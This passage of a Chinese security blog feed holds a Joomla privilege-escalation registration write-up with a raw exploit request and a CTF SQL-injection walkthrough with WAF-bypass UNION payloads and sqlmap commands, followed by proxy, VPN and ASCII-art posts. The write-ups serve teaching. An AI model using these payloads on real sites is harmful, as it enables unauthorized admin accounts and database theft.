class="attribute">-----------------------------602419586513</span></span><br><span class="line"><span class="attribute">Content-Disposition</span>: form-data; name="user[groups][]"</span><br><span class="line"></span><br><span class="line">7  </span><br><span class="line">-----------------------------602419586513</span><br><span class="line"><span class="attribute">Content-Disposition</span>: form-data; name="option"</span><br><span class="line"></span><br><span class="line"><span class="attribute">com_users</span></span><br><span class="line"><span class="attribute">-----------------------------602419586513</span></span><br><span class="line"><span class="attribute">Content-Disposition</span>: form-data; name="task"</span><br><span class="line"></span><br><span class="line">user.register  </span><br><span class="line">-----------------------------602419586513</span><br><span class="line"><span class="attribute">Content-Disposition</span>: form-data; name="mytoken"</span><br><span class="line"></span><br><span class="line"><span class="attribute">1</span></span><br><span class="line"><span class="attribute">-----------------------------602419586513--</span></span><br></pre></td></tr></table></figure></p><p>数据包发送成功，邮箱收到激活邮件</p><p><img src="/static/picture/joomla_create_user_unauthorized1.png" alt="邮箱收到激活邮件"><br>然而点击激活却返回403禁止访问。</p><p><img src="/static/picture/joomla_create_user_unauthorized2.png" alt="403禁止访问"><br>管理后台查看用户状态发现没有启用和激活</p><p><img src="/static/picture/joomla_create_user_unauthorized3.png" alt="管理后台查看用户状"></p><h2 id="0x02激活失败原因分析"><a href="#0x02激活失败原因分析" class="headerlink" title="0x02激活失败原因分析"></a>0x02激活失败原因分析</h2><p>查看<code>/components/com_users/controllers/registration.php</code>源码，分析激活函数部分<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">activate</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">$user   = JFactory::getUser();</span><br><span class="line">$input  = JFactory::getApplication()-&gt;input;</span><br><span class="line">$uParams = JComponentHelper::getParams(<span class="string">'com_users'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Check for admin activation. Don't allow non-super-admin to delete a super admin</span></span><br><span class="line"><span class="keyword">if</span> ($uParams-&gt;get(<span class="string">'useractivation'</span>) != <span class="number">2</span> &amp;&amp; $user-&gt;get(<span class="string">'id'</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;setRedirect(<span class="string">'index.php'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// If user registration or account activation is disabled, throw a 403.</span></span><br><span class="line"><span class="keyword">if</span> ($uParams-&gt;get(<span class="string">'useractivation'</span>) == <span class="number">0</span> || $uParams-&gt;get(<span class="string">'allowUserRegistration'</span>) == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">JError::raiseError(<span class="number">403</span>, JText::_(<span class="string">'JLIB_APPLICATION_ERROR_ACCESS_FORBIDDEN'</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$model = <span class="keyword">$this</span>-&gt;getModel(<span class="string">'Registration'</span>, <span class="string">'UsersModel'</span>);</span><br><span class="line">$token = $input-&gt;getAlnum(<span class="string">'token'</span>);</span><br><span class="line"></span><br><span class="line">……</span><br><span class="line">以下省略</span><br></pre></td></tr></table></figure></p><p>激活函数判断如果注册用户激活方式<strong>不是Self(用户激活模式)</strong> 或者如果<strong>网站注册功能关闭</strong>均会返回403禁止访问,从而导致不能成功激活和登录，即网站关闭注册功能就不能激活，只有激活方式是None（不用激活）才能成功利用。安装joomla后默认关闭网站注册功能而且账户激活方式是”Self”用户激活方式，根据上面分析表明如果网站是关闭了注册功能，那么用户就不能成功激活，当然，也不能成功登录。</p><p><img src="/static/picture/joomla_create_user_unauthorized4.png" alt="账户激活方式"></p><h2 id="0x03应用场景总结"><a href="#0x03应用场景总结" class="headerlink" title="0x03应用场景总结"></a>0x03应用场景总结</h2><ol><li>网站开启注册功能，注册用户激活方式为”Self”或者”None”可以利用此漏洞注册获得高权限用户。</li><li>网站关闭用户注册功能，但是新用户注册激活方式为”None”,即不需要激活。可以利用此漏洞注册获得高权限用户</li></ol>]]></content>
      
      <categories>
          
          <category> Security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Security </tag>
            
            <tag> Joomla </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>补天沙龙成都站入场券CTF</title>
      <link href="/2016/10/22/butian_chengdu_salon_ctf/"/>
      <url>/2016/10/22/butian_chengdu_salon_ctf/</url>
      <content type="html"><![CDATA[<h2 id="0x00前言"><a href="#0x00前言" class="headerlink" title="0x00前言"></a>0x00前言</h2><p>&emsp;&emsp;10月22补天成都沙龙，GO!GO!GO,入场需要CTF，个人Writeup早就写好了，尊重游戏规则，现在才发布。<br><a id="more"></a></p><h2 id="0x01过程"><a href="#0x01过程" class="headerlink" title="0x01过程"></a>0x01过程</h2><p>1.CTF地址：<a href="http://butian.secbox.cn/" target="_blank" rel="noopener">http://butian.secbox.cn/</a><br>访问链接得到下图:</p><p><img src="/static/picture/butian_ctf1.png" alt="访问链接"></p><p>添加?id=1,2,3,4得到不同信息，id=3时提示flag在数据库中，id=4提示需要bypass<br><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span><span class="comment">//butian.secbox.cn/?id=3</span></span><br></pre></td></tr></table></figure></p><p><img src="/static/picture/butian_ctf2.png" alt="flag is in database"></p><p>利用简单手工注入测试<code>and 1=1</code>或<code>order by 1</code>被waf拦截了，测试过滤了：<code>空格、+、and、order、by</code></p><p><img src="/static/picture/butian_ctf3.png" alt="简单手工注入"></p><p>暂时没有想法，直接上sqlmap<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u <span class="string">"butian.secbox.cn?id=4"</span> --tamper=space2comment --dbs</span><br></pre></td></tr></table></figure></p><p><img src="/static/picture/butian_ctf4.png" alt="enter description here"><br>测试出有注入，然而只能获得数据库名为”websql”，无法获取表名和列名</p><p>工具不成功，接着根据sqlmap的测试payload，构造如下payload获取数据库基本信息<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://butian.secbox.cn/?id=-1/**/UNION/**/ALL/**/SELECT/**/CONCAT_WS(CHAR(32,58,32),user(),database(),version())</span><br></pre></td></tr></table></figure></p><p><img src="/static/picture/butian_ctf5.png" alt="get information"><br>测试手工利用information_schema数据库注入获取表名和列名，发现仍然被waf拦截，测试发现WAF拦截了：”infor” ,此路不通！</p><p>接着小伙伴灵机一动，在sqlmap的爆破猜表名、列名中添加”butian”、”flag”等。灵光闪现，列名和表明都是”flag”,<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u <span class="string">"butian.secbox.cn?id=4"</span> --tamper=space2comment --tables -D <span class="string">"websql"</span></span><br><span class="line">python sqlmap.py -u <span class="string">"butian.secbox.cn?id=4"</span> --tamper=space2comment --columns -T <span class="string">"flag"</span> -D <span class="string">"websql"</span></span><br></pre></td></tr></table></figure></p><p>测试–dump获取数据，然而没有得到任何信息<br>手动提交吧<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://butian.secbox.cn/?id=-1<span class="comment">/**/</span>UNION<span class="comment">/**/</span>ALL<span class="comment">/**/</span><span class="keyword">SELECT</span><span class="comment">/**/</span>flag<span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>flag</span><br></pre></td></tr></table></figure></p><p><img src="/static/picture/butian_ctf6.png" alt="flag"></p><p><strong>Bingo!</strong></p><h2 id="0x02后续"><a href="#0x02后续" class="headerlink" title="0x02后续"></a>0x02后续</h2><p>成功提交flag以后，纠结sqlmap的dump为什么不能获取到数据，于是挂个代理看看，执行如下命令<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u <span class="string">"butian.secbox.cn?id=4"</span> --tamper=space2comment --dump -C <span class="string">"flag"</span> -T <span class="string">"flag"</span> -D <span class="string">"websql"</span> --proxy=<span class="string">"http://127.0.0.1:8080/"</span></span><br></pre></td></tr></table></figure></p><p>burp抓到的包内容为（URLdecode后）：<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">GET /?id=-4678<span class="comment">/**/</span>UNION<span class="comment">/**/</span>ALL<span class="comment">/**/</span><span class="keyword">SELECT</span><span class="comment">/**/</span><span class="keyword">CONCAT</span>(<span class="number">0x717a767671</span>,<span class="keyword">IFNULL</span>(<span class="keyword">CAST</span>(flag<span class="comment">/**/</span><span class="keyword">AS</span><span class="comment">/**/</span><span class="built_in">CHAR</span>),<span class="number">0x20</span>),<span class="number">0x7171717171</span>)<span class="comment">/**/</span><span class="keyword">FROM</span><span class="comment">/**/</span>websql.flag<span class="comment">/**/</span><span class="keyword">ORDER</span><span class="comment">/**/</span><span class="keyword">BY</span><span class="comment">/**/</span>flag# <span class="keyword">HTTP</span>/<span class="number">1.1</span></span><br><span class="line"><span class="keyword">Accept</span>-<span class="keyword">Language</span>: en-us,en;q=0.5</span><br><span class="line">Accept-Encoding: gzip,deflate</span><br><span class="line">Host: butian.secbox.cn</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">User-Agent: sqlmap/1.0-dev-nongit-20160604 (http://sqlmap.org)</span><br><span class="line">Accept-Charset: ISO-8859-15,utf-8;q=0.7,*;q=0.7</span><br><span class="line">Connection: close</span><br><span class="line"><span class="keyword">Pragma</span>: <span class="keyword">no</span>-<span class="keyword">cache</span></span><br><span class="line"><span class="keyword">Cache</span>-Control: <span class="keyword">no</span>-<span class="keyword">cache</span>,<span class="keyword">no</span>-<span class="keyword">store</span></span><br></pre></td></tr></table></figure></p><p>分析由于sqlmap语句中包含了<code>ORDER/**/BY/**/flag</code>,手工去掉，然后hackbar提交如下<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://butian.secbox.cn?id=-4678<span class="comment">/**/</span>UNION<span class="comment">/**/</span>ALL<span class="comment">/**/</span><span class="keyword">SELECT</span><span class="comment">/**/</span><span class="keyword">CONCAT</span>(<span class="number">0x717a767671</span>,<span class="keyword">IFNULL</span>(<span class="keyword">CAST</span>(flag<span class="comment">/**/</span><span class="keyword">AS</span><span class="comment">/**/</span><span class="built_in">CHAR</span>),<span class="number">0x20</span>),<span class="number">0x7171717171</span>)<span class="comment">/**/</span><span class="keyword">FROM</span><span class="comment">/**/</span>websql.flag</span><br></pre></td></tr></table></figure></p><p><img src="/static/picture/butian_ctf7.png" alt="sqlmap dump修改"></p><h2 id="0x03总结"><a href="#0x03总结" class="headerlink" title="0x03总结"></a>0x03总结</h2><ul><li>此次CTF由于WAF拦截了：<code>空格、+、and、order、by、infor</code>，所以需要用<code>/**/</code>代替空格，而且只能用id=-4678（负数皆可）替代<code>and 1=2</code>使得前部分SQL语句为“假”，同时也不能使用查询information_schema数据库获得表名和列名，采取猜测的方法。</li><li>mysql数据库中CONCAT()函数用于将不同的字符连接在一起输出,执行<code>SELECT CONCAT(&#39;my&#39;,&#39;sql&#39;);</code>会得到”mysql”</li><li>mysql数据库中的CAST()函数用于将获取的值都转换为指定类型,执行<code>SELECT CAST(1 as CHAR)</code>会得到字符型的’1’</li><li>mysql数据库中IFNULL(expr1,expr2)函数用来当第一个表达式expr1不是NULL时返回expr1,否则返回expr2。执行<code>SELECT IFNULL(NULL,&#39;IS_NULL&#39;);</code>返回”IS_NULL”,执行<code>SELECT IFNULL(&#39;test&#39;,&#39;IS_NULL&#39;);</code>,返回”test”</li><li>mysql数据库中，手工猜测表名<code>SELECT EXISTS(SELECT * FROM 表名)</code>，手工猜测列名<code>SELECT EXISTS(SELECT 列名 FROM 表名)</code></li></ul>]]></content>
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Writeup </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Proxifier+Shadowshocks系统全局代理的正确姿势</title>
      <link href="/2016/09/19/Proxifier_Shadowshocks/"/>
      <url>/2016/09/19/Proxifier_Shadowshocks/</url>
      <content type="html"><![CDATA[<h2 id="0x00前言"><a href="#0x00前言" class="headerlink" title="0x00前言"></a>0x00前言</h2><p>&emsp;&emsp;成功搭建使用shadowshocks实现代理访问google，然而只能浏览器代理方式使用，不能其他程序使用代理，不利于白帽子匿名安全检测，下面将介绍利用Proxifier实现全局代理。<br><a id="more"></a></p><h2 id="0x01安装"><a href="#0x01安装" class="headerlink" title="0x01安装"></a>0x01安装</h2><p>官网发布多个版本，其中便携版不需要安装，直接双击运行，安装版则直接安装即可<br>&emsp;&emsp;Windows便携版：<a href="https://www.proxifier.com/distr/ProxifierPE.zip" target="_blank" rel="noopener">官网地址</a><br>&emsp;&emsp;Windows安装版：<a href="https://www.proxifier.com/distr/ProxifierSetup.exe" target="_blank" rel="noopener">官网地址</a><br>&emsp;&emsp;Mac版：<a href="https://www.proxifier.com/distr/ProxifierMac.zip" target="_blank" rel="noopener">官网地址</a></p><h2 id="0x02使用教程"><a href="#0x02使用教程" class="headerlink" title="0x02使用教程"></a>0x02使用教程</h2><p>1.打开软件点击Profile，接下来配置的三步顺序</p><ul><li>代理服务器配置</li><li>代理规则设置</li><li>域名解析设置</li></ul><p><img src="/static/picture/proxifier1.png" alt="点击Profile"></p><p>2.配置第一步</p><ul><li>点击Proxy Server按钮</li><li>add</li><li>输入本地shadowshocks的ip（默认127.0.0.1）和端口（默认1080）</li><li>选择SHOCKS Versin 5</li><li>然后点击check</li><li>OK</li></ul><p><img src="/static/picture/proxifier2.png" alt="Proxy Server"><br>显示Proxy is ready to work with Proxfier! 则此步骤配置成功，否则认真检查端口是否正确以及shadowsocks是否运行。</p><p><img src="/static/picture/proxifier3.png" alt="check"></p><p><strong>接下来的两步配置至关重要，配置错误可能导致全局代理失败或者循环代理</strong><br>3.配置第二步</p><ul><li>点击Proxification Rule</li><li>选中localhost,点击Edit</li><li>Target hosts处添加shadowshocks代理服务器的IP地址（以123.123.123.123示例）</li><li>Action选择Direct(直连)</li><li>OK</li></ul><p><img src="/static/picture/Proxifier4.png" alt="enter description here"></p><p>注：此配置步骤允许发送到代理服务器的数据包通过，防止循环代理错误<br>配置后如图</p><p><img src="/static/picture/Proxifier5.png" alt="enter description here"></p><p>4.配置第三步</p><ul><li>点击Name Resolution</li><li>选择第二个Resolve hostnames through proxy（通过代理服务器解析域名）</li><li>OK</li></ul><p><img src="/static/picture/proxifier6.png" alt="enter description here"></p><p>5.至此，全局代理已经配置完毕，用CMD命令<code>nslookup www.google.com</code>测试是否成功获取其IP地址，也可以直接访问<a href="http://www.ip138.com" target="_blank" rel="noopener">www.ip138.com</a>查看当前外网IP地址。</p><h2 id="0x03其他使用"><a href="#0x03其他使用" class="headerlink" title="0x03其他使用"></a>0x03其他使用</h2><ul><li>Proxifier的规则设置十分灵活强大，可以默认所有数据流量都通过代理，即以上设置。</li><li>同时也可以通过对特殊应用或者端口进行更细粒度的代理设置，比如想要QQ数据包不通过代理，只需要添加规则，应用选择QQ,直连即可</li><li>如果想尽量减小代理的流量 也可以修改默认规则为直连，然后添加需要的特殊应用为代理访问</li></ul>]]></content>
      
      <categories>
          
          <category> 技术研究 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Proxifier </tag>
            
            <tag> Shadowshocks </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>浅谈VPN和代理</title>
      <link href="/2016/09/10/vpn_proxy/"/>
      <url>/2016/09/10/vpn_proxy/</url>
      <content type="html"><![CDATA[<h2 id="0x00前言"><a href="#0x00前言" class="headerlink" title="0x00前言"></a>0x00前言</h2><p>&emsp;&emsp;VPN和代理是两种常见的“翻墙”方式，那么两者的区别是什么呢：适用性？安全性？访问速度等？<br><a id="more"></a></p><h2 id="0x01代理"><a href="#0x01代理" class="headerlink" title="0x01代理"></a>0x01代理</h2><h3 id="1-1原理"><a href="#1-1原理" class="headerlink" title="1.1原理"></a>1.1原理</h3><ul><li>代理服务器位于客户端和访问互联网之间，服务器接收客户端的请求，然后代替客户端向目标网站发出请求，所有的流量路由均来自代理服务器的IP地址，从而获取到一些不能直接获取的资源。</li></ul><h3 id="1-2代理分为HTTP代理和SOCKET代理"><a href="#1-2代理分为HTTP代理和SOCKET代理" class="headerlink" title="1.2代理分为HTTP代理和SOCKET代理"></a>1.2代理分为HTTP代理和SOCKET代理</h3><p> &emsp;&emsp;HTTP代理是在HTTP协议层的代理服务，只能处理HTTP/HTTPS请求，主要满足用户Web浏览网页需求，由于只处理HTTP请求，处理速度极快。<br> &emsp;&emsp;SOCKET代理不解析网络流量，传递数据包而并不关心是何种应用协议,这使得SOCKET代理可以用于多种环境，支持FTP、SMTP、HTTP等，也支持QQ、BT下载等多种应用，典型的有Shadowsocks。通常分为socks 4 和socks 5两种类型，socks 4只支持TCP协议而socks 5支持TCP/UDP协议，还支持各种身份验证机制等协议。</p><h2 id="0x02VPN"><a href="#0x02VPN" class="headerlink" title="0x02VPN"></a>0x02VPN</h2><h3 id="2-1原理"><a href="#2-1原理" class="headerlink" title="2.1原理"></a>2.1原理</h3><p>  &emsp;&emsp;VPN(Virtual Private Network),在客户端和主机之间建立加密隧道，客户端的请求通过加密将所有方式发送给VPN服务器。</p><h3 id="2-2主流VPN分为PPTP、SSL-VPN-、IPSec-VPN"><a href="#2-2主流VPN分为PPTP、SSL-VPN-、IPSec-VPN" class="headerlink" title="2.2主流VPN分为PPTP、SSL VPN 、IPSec VPN"></a>2.2主流VPN分为PPTP、SSL VPN 、IPSec VPN</h3><p>  &emsp;&emsp;PPTP(Point to Point Tunneling Protocol)点对点隧道协议。用PPP协议对数据进行封装，添加附加包头用于互联网络上数据的传输工作，采用MPLS加密认证方式，工作在数据链路层。目前的计算机、智能手机等设备均支持此协议，不用额外安装软件即可连接。<br>  &emsp;&emsp;IPSec(Internet Protocol Security)VPN采用IPSec协议实现VPN技术，工作在网络层。包括LAN TO LAN(站到站)、ENDTO LAN(端到站)等方式。</p><h2 id="0x03对比"><a href="#0x03对比" class="headerlink" title="0x03对比"></a>0x03对比</h2><h3 id="3-1-资源特性"><a href="#3-1-资源特性" class="headerlink" title="3.1 资源特性"></a>3.1 资源特性</h3><ul><li>VPN方式是将客户端和服务器配置在一个LAN域，所有在配置VPN服务器时要求给服务器指定LAN于内的IP,且声明可以用于分配给客户端的IP范围，每个客户端连接VPN后，会分配到一个特点的IP地址，可以通过ipconfig/ifconfig查看到。</li><li>代理方式，服务器只接受客户端的请求数据包，然后转发，客户端不会分配得到特定的IP地址。</li></ul><h3 id="3-2-适用性"><a href="#3-2-适用性" class="headerlink" title="3.2 适用性"></a>3.2 适用性</h3><ul><li>PPTP VPN/IPSec VPN等常见VPN适用性最佳，计算机设备、智能手机、PAD登智能设备默认支持此类VPN连接，不需要任何额外的软件即可获得VPN服务。SSL VPN通常需要安装特定的软件才能使用。默认计算机的所有流量都通过VPN传输</li><li>代理方式一般需要安装客户端才能使用，也可以通过浏览器代理设置，默认只有设置了代理的应用(通常是浏览器)的流量包才通过代理服务器。</li></ul><h3 id="3-3-安全性"><a href="#3-3-安全性" class="headerlink" title="3.3 安全性"></a>3.3 安全性</h3><ul><li>其中PPTP是最常见的VPN，安装部署非常简便，网上不乏“一键搭建”的教程，然而PPTP VPN采用MSCHAPV2认证协议，该协议在网上爆出了很多的安全缺陷，可能导致中间人攻击，弱口令爆破（asleap+thc-pptp-bruter），而且秘钥空间只有2^56,利用专业的攻击设备可以在短时间内破解加密密钥，获取VPN通信内容。</li><li>IPSec VPN采用AH协议提供数据完整性和身份识别，采用ESP协议实现数据加密。SSL VPN采用SSL加密通信流，相对PPTP而言拥有更高的安全性。</li><li>Shadowsocks采用 AES-256-CFB或RC4-MD5加密，安全性也相对较高。</li></ul><h3 id="3-4-访问速度"><a href="#3-4-访问速度" class="headerlink" title="3.4 访问速度"></a>3.4 访问速度</h3><ul><li>网上针对SOCKET和HTTP代理速度比较各执一词，有人认为SOCKET代理直接转发流量，并不关心具体的协议，因而速度更快；也有说由于支持处理的协议多，加密耗时更长，因而速度更慢。笔者觉得实际应用中，限制的因素大部分是客户端到VPS的访问速度，加密耗时及协议数量不是决定性因素，带宽相对固定式，协议类型多样，导致网页的浏览速度感官上变慢，然而总流量几乎是持平的。这也可以类比于Shadowsocks代理浏览器访问感觉比VPN快，应为默认VPN是系统全局代理，所有请求流量都要耗费带宽，而Shadowsocks则只有代理的数据流量，同样带宽感官上浏览速度确实较快。 </li></ul><h2 id="0x04参考"><a href="#0x04参考" class="headerlink" title="0x04参考"></a>0x04参考</h2><p><a href="https://wiki.debian.org/OpenVPN" target="_blank" rel="noopener">Debian OpenVPN安装官方教程</a><br><a href="https://help.ubuntu.com/lts/serverguide/openvpn.html" target="_blank" rel="noopener">Ubuntu OpenVPN安装官方教程</a><br><a href="https://help.ubuntu.com/community/PPTPServer" target="_blank" rel="noopener">Ubuntu PPTP安装教程</a><br><a href="https://www.bestvpn.com/blog/4085/proxies-vs-vpn-whats-the-difference/" target="_blank" rel="noopener">Proxies vs. VPN – What’s the difference?</a><br><a href="http://www.h-online.com/security/features/A-death-blow-for-PPTP-1716768.html" target="_blank" rel="noopener">A death blow for PPTP</a><br><a href="https://github.com/shadowsocks/shadowsocks/wiki/Shadowsocks-%E4%BD%BF%E7%94%A8%E8%AF%B4%E6%98%8E" target="_blank" rel="noopener">Shadowsocks 使用说明</a></p>]]></content>
      
      <categories>
          
          <category> 技术研究 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> VPN </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>字符串LOGO在线制作之ascii arts</title>
      <link href="/2016/08/05/LOGO_ascii_arts/"/>
      <url>/2016/08/05/LOGO_ascii_arts/</url>
      <content type="html"><![CDATA[<h2 id="0x00前言"><a href="#0x00前言" class="headerlink" title="0x00前言"></a>0x00前言</h2><p>&emsp;&emsp;各种优秀的开源程序运行都有一个帅气的字符logo，是不是都在惊叹如此高端洋气的设计，其实每个程序员都可以轻松拥有。<br>&emsp;&emsp;ascii arts即为用ascii字符作画之意<br><a id="more"></a></p><h2 id="0x01设计"><a href="#0x01设计" class="headerlink" title="0x01设计"></a>0x01设计</h2><p>&emsp;&emsp;推荐两个在线资源<a href="http://www.asciiarts.net/" target="_blank" rel="noopener">ASCII Art | Generator</a>和<a href="http://patorjk.com/software/taag/#p=testall&amp;f=Isometric2&amp;t=HelloWord" target="_blank" rel="noopener">Text to ASCII Art Generator (TAAG)</a><br><strong>1.1</strong>  <a href="http://www.asciiarts.net/" target="_blank" rel="noopener">ASCII Art | Generator</a><br>特点：支持多种格式转换（可能需要翻墙）<br>1.文字转换：<a href="http://www.asciiarts.net/figlet.font.php" target="_blank" rel="noopener">更多样式</a><br><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">            <span class="keyword">_</span> <span class="keyword">_</span>       </span><br><span class="line">  /\  /\___| <span class="type">| | ___</span>  </span><br><span class="line"> / /<span class="keyword">_</span>/ / <span class="keyword">_</span> \ | <span class="type">|/ _</span> \ </span><br><span class="line">/ __  /  __/ | <span class="type">| (_</span>) |<span class="type"></span></span><br><span class="line"><span class="type">\/ /_</span>/ \___|<span class="type">_</span>|<span class="type">_</span>|<span class="type">\___</span>/</span><br></pre></td></tr></table></figure></p><p>2.图片转换（小于300K）<br><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line">                                                                                      </span><br><span class="line">                                                                                      </span><br><span class="line">                                                                                      </span><br><span class="line">                                                                                      </span><br><span class="line">                                                                                      </span><br><span class="line">                                    `<span class="javascript">:.</span>`+<span class="comment">#.                                           </span></span><br><span class="line">                            .+<span class="comment">######</span><span class="comment">######</span>                                            </span><br><span class="line">                          `<span class="javascript">##############+ </span>``<span class="javascript"></span>`                                        </span><br><span class="line">                         :<span class="comment">######</span><span class="comment">######</span><span class="comment">######</span><span class="comment">####,                                     </span></span><br><span class="line"><span class="comment">                       .###</span><span class="comment">######</span><span class="comment">######</span><span class="comment">######</span><span class="comment">#####`                                   </span></span><br><span class="line"><span class="comment">                      .###</span><span class="comment">######</span><span class="comment">######</span><span class="comment">######</span><span class="comment">######</span><span class="comment">#.                                  </span></span><br><span class="line">                      <span class="comment">####''''''###</span><span class="comment">######</span><span class="comment">######</span><span class="comment">#####.                                 </span></span><br><span class="line"><span class="comment">                     '###</span><span class="string">''</span><span class="comment">##+'''####################                                 </span></span><br><span class="line">                    `<span class="javascript">###<span class="string">'#+'</span><span class="string">''</span><span class="string">''</span>+##+<span class="string">'+###############+                                </span></span></span><br><span class="line"><span class="javascript">                    +#####+<span class="string">''</span>+####+++#<span class="string">''</span>##############</span>`                               </span><br><span class="line">                   `<span class="javascript">######<span class="string">'+######++++++'</span><span class="string">'############+                               </span></span></span><br><span class="line"><span class="javascript">                   ##<span class="string">'###'</span>#########+++##+<span class="string">''</span>############</span>`                              </span><br><span class="line">                  `<span class="javascript">#<span class="string">'###+###+###+++++++##++'</span>###########+                              </span></span><br><span class="line"><span class="javascript">                  :#<span class="string">'#######'</span>#+#++++++++###+<span class="string">'###########                              </span></span></span><br><span class="line"><span class="javascript">                  #<span class="string">''</span>######<span class="string">''</span>+##++++++++####+<span class="string">'##########;                             </span></span></span><br><span class="line"><span class="javascript">                  #<span class="string">'+#####'</span><span class="string">'+###++++++###################                             </span></span></span><br><span class="line"><span class="javascript">                 .#<span class="string">'######'</span>+#####++++++##########<span class="string">'#######:                            </span></span></span><br><span class="line"><span class="javascript">                 <span class="string">''</span><span class="string">'#####'</span>+#######++++++##########<span class="string">'#######                            </span></span></span><br><span class="line"><span class="javascript">                 #<span class="string">'+#####+#######'</span>+++++++#######<span class="string">'#'</span>#######</span>`                           </span><br><span class="line">                ,<span class="comment">#'#####+######'  `+++++#+######+'#'######'                           </span></span><br><span class="line">                <span class="comment">#+############:    :++++#########'+'#######                           </span></span><br><span class="line">               :<span class="comment">######</span><span class="comment">######</span><span class="comment">#+      ++#+#+#######'''#######                           </span></span><br><span class="line">              .<span class="comment">######</span><span class="comment">######</span><span class="comment">##       `+####+######''++######                           </span></span><br><span class="line">             `<span class="javascript">###########+##:        <span class="string">'####++#####+'</span>#+######.                          </span></span><br><span class="line"><span class="javascript">             